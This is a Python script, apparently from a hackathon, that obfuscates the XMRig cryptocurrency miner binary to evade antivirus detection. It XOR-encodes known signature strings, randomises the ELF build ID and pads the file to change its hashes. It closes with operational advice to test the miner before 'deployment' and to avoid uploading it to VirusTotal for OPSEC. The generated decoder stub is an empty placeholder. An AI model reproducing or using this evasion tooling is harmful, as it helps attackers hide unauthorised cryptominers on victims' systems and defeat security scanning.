#!/usr/bin/env python3
"""
XMRig Binary Obfuscation Tool
Purpose: Modify XMRig binary to evade signature-based detection
Author: OSCP Hackathon 2025
Usage: python3 obfuscate_binary.py <input_binary> <output_binary>
"""

import sys
import os
import random
import struct
import hashlib

class BinaryObfuscator:
    def __init__(self, input_file):
        self.input_file = input_file
        self.data = None
        self.modifications = []

    def load_binary(self):
        """Load binary into memory"""
        with open(self.input_file, 'rb') as f:
            self.data = bytearray(f.read())
        print(f"[+] Loaded binary: {len(self.data)} bytes")

    def obfuscate_strings(self):
        """XOR obfuscate known signature strings"""
        signatures = [
            b"donate.v2.xmrig.com",
            b"donate.ssl.xmrig.com",
            b"xmrig",
            b"XMRig",
            b"randomx",
            b"huge-pages",
            b"pool_wallet"
        ]

        xor_key = random.randint(1, 255)
        modifications = 0

        for sig in signatures:
            offset = 0
            while True:
                try:
                    idx = self.data.index(sig, offset)
                    # XOR encode the string
                    for i in range(len(sig)):
                        self.data[idx + i] ^= xor_key
                    modifications += 1
                    self.modifications.append(f"XOR encoded '{sig.decode()}' at offset {hex(idx)} with key {hex(xor_key)}")
                    offset = idx + len(sig)
                except ValueError:
                    break

        print(f"[+] Obfuscated {modifications} signature strings with XOR key {hex(xor_key)}")
        return xor_key

    def modify_build_id(self):
        """Change the ELF build ID to avoid hash-based detection"""
        # Find .note.gnu.build-id section
        elf_magic = self.data[0:4]
        if elf_magic != b'\x7fELF':
            print("[-] Not a valid ELF file")
            return

        # Simple approach: find and modify build ID
        build_id_marker = b'\x03\x00\x00\x00'  # NT_GNU_BUILD_ID
        try:
            idx = self.data.index(build_id_marker)
            # Modify the build ID hash (next 20 bytes typically)
            for i in range(20):
                self.data[idx + 4 + i] = random.randint(0, 255)
            print(f"[+] Modified build ID at offset {hex(idx)}")
            self.modifications.append(f"Build ID modified at {hex(idx)}")
        except ValueError:
            print("[-] Build ID section not found")

    def add_padding(self):
        """Add random padding to change file size"""
        padding_size = random.randint(1024, 4096)
        padding = bytes([random.randint(0, 255) for _ in range(padding_size)])
        self.data.extend(padding)
        print(f"[+] Added {padding_size} bytes of random padding")
        self.modifications.append(f"Added {padding_size} bytes padding")

    def modify_section_names(self):
        """Modify section names to avoid pattern matching"""
        # This is simplified - real implementation would parse ELF headers
        section_names = [b".text", b".data", b".rodata", b".bss"]

        for name in section_names:
            offset = 0
            while True:
                try:
                    idx = self.data.index(name, offset)
                    # Verify it's actually a section name (crude check)
                    if idx > 100 and self.data[idx-1] == 0:
                        # Modify slightly (still valid but different)
                        new_name = name.decode() + str(random.randint(1, 9))
                        self.data[idx:idx+len(name)] = new_name.encode()[:len(name)]
                        self.modifications.append(f"Modified section name at {hex(idx)}")
                    offset = idx + len(name)
                except ValueError:
                    break

    def calculate_hashes(self, data):
        """Calculate hash values for verification"""
        md5 = hashlib.md5(data).hexdigest()
        sha256 = hashlib.sha256(data).hexdigest()
        return md5, sha256

    def save_binary(self, output_file):
        """Save obfuscated binary"""
        with open(output_file, 'wb') as f:
            f.write(self.data)

        # Make executable
        os.chmod(output_file, 0o755)

        md5, sha256 = self.calculate_hashes(self.data)
        print(f"[+] Saved obfuscated binary: {output_file}")
        print(f"[+] Size: {len(self.data)} bytes")
        print(f"[+] MD5: {md5}")
        print(f"[+] SHA256: {sha256}")

    def save_decoder(self, xor_key, output_file):
        """Generate decoder stub for runtime decoding"""
        decoder_code = f"""#!/usr/bin/env python3
# Runtime decoder for obfuscated XMRig
# XOR Key: {hex(xor_key)}

import sys

def decode_strings(binary_path, xor_key):
    with open(binary_path, 'rb') as f:
        data = bytearray(f.read())

    # Decode strings at runtime
    # Note: This is for educational purposes
    # In production, decoder would be in C/compiled

    return data

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 decoder.py <binary>")
        sys.exit(1)

    decoded = decode_strings(sys.argv[1], {xor_key})
    print("[+] Decoded binary")
"""
        with open(output_file, 'w') as f:
            f.write(decoder_code)
        print(f"[+] Decoder stub saved to: {output_file}")

    def save_modification_log(self, output_file):
        """Save log of modifications for reference"""
        with open(output_file, 'w') as f:
            f.write("=== Binary Obfuscation Log ===\n\n")
            f.write(f"Original: {self.input_file}\n")
            f.write(f"Size: {len(self.data)} bytes\n\n")
            f.write("Modifications:\n")
            for i, mod in enumerate(self.modifications, 1):
                f.write(f"{i}. {mod}\n")
        print(f"[+] Modification log saved to: {output_file}")

def main():
    if len(sys.argv) != 3:
        print("XMRig Binary Obfuscator")
        print("=" * 50)
        print("Usage: python3 obfuscate_binary.py <input> <output>")
        print("\nExample:")
        print("  python3 obfuscate_binary.py xmrig xmrig_obfuscated")
        print("\nPurpose:")
        print("  - Obfuscate signature strings with XOR encoding")
        print("  - Modify build ID to avoid hash detection")
        print("  - Add random padding to change file size")
        print("  - Modify section names")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]

    if not os.path.exists(input_file):
        print(f"[-] Error: Input file '{input_file}' not found")
        sys.exit(1)

    print("=" * 60)
    print("XMRig Binary Obfuscation Tool - OSCP Hackathon 2025")
    print("=" * 60)
    print()

    obfuscator = BinaryObfuscator(input_file)

    # Step 1: Load binary
    obfuscator.load_binary()

    # Calculate original hashes
    orig_md5, orig_sha256 = obfuscator.calculate_hashes(obfuscator.data)
    print(f"[*] Original MD5: {orig_md5}")
    print(f"[*] Original SHA256: {orig_sha256}")
    print()

    # Step 2: Obfuscate
    print("[*] Starting obfuscation...")
    xor_key = obfuscator.obfuscate_strings()
    obfuscator.modify_build_id()
    obfuscator.add_padding()
    # obfuscator.modify_section_names()  # Commented out - can break binary
    print()

    # Step 3: Save
    obfuscator.save_binary(output_file)
    obfuscator.save_decoder(xor_key, output_file + "_decoder.py")
    obfuscator.save_modification_log(output_file + "_log.txt")

    print()
    print("=" * 60)
    print("[✓] Obfuscation complete!")
    print("=" * 60)
    print(f"\nFiles created:")
    print(f"  1. {output_file} (obfuscated binary)")
    print(f"  2. {output_file}_decoder.py (runtime decoder)")
    print(f"  3. {output_file}_log.txt (modification log)")
    print(f"\nNext steps:")
    print(f"  1. Test binary: ./{output_file} --help")
    print(f"  2. Verify functionality before deployment")
    print(f"  3. DO NOT upload to VirusTotal (OPSEC!)")

if __name__ == "__main__":
    main()
